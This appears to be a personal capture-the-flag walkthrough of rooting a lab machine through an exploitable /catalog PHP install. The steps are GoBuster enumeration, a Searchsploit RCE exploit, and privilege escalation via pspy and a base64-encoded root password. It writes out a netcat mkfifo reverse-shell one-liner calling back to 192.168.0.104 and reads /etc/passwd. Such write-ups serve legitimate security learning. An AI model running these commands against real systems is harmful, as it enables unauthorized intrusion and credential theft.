$IP/index.html - nothing interesting. static page.

**GoBuster** - found /catalog. navigating to this directory redirected me to $IP/catalog/install/index.php

**Searchsploit** - php/webapps/44374.py

edited the code:
base/taget url
added a proxy (burpsuite)

![[Pasted image 20210731215214.png]]
![[Pasted image 20210731215242.png]]

Now I have RCE but it redirects Stdout to configure.php

enumerated users via burp (URL ENCODE):
ls -la /home
cat /etc/passwd

tried to print the source code of configure.php.bak but since it's php, we have to base64 encode it. resulted to:
![[Pasted image 20210731221909.png]]

but the important things are:
![[Pasted image 20210731222004.png]]

using the RCE from Searchsploit, managed to get a reverse shell using:

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.104 9999 >/tmp/f

### As www-data
got a shell as www-data, su'ed to jack:
![[Pasted image 20210801000837.png]]

### As jack
sudo -l : jack can't run any command as sudo
find / -perm -4000 -user root 2>/dev/null : no uncommon SUID binary
getcap -r / 2>/dev/null : no exploitable capabilities

pspy64 :
![[Pasted image 20210801011929.png]]

![[Pasted image 20210801010951.png]]

catting it results to a base64 encoded string that gives us the root password when decoded:
![[Pasted image 20210801011047.png]]

root.txt:
![[Pasted image 20210801011149.png]]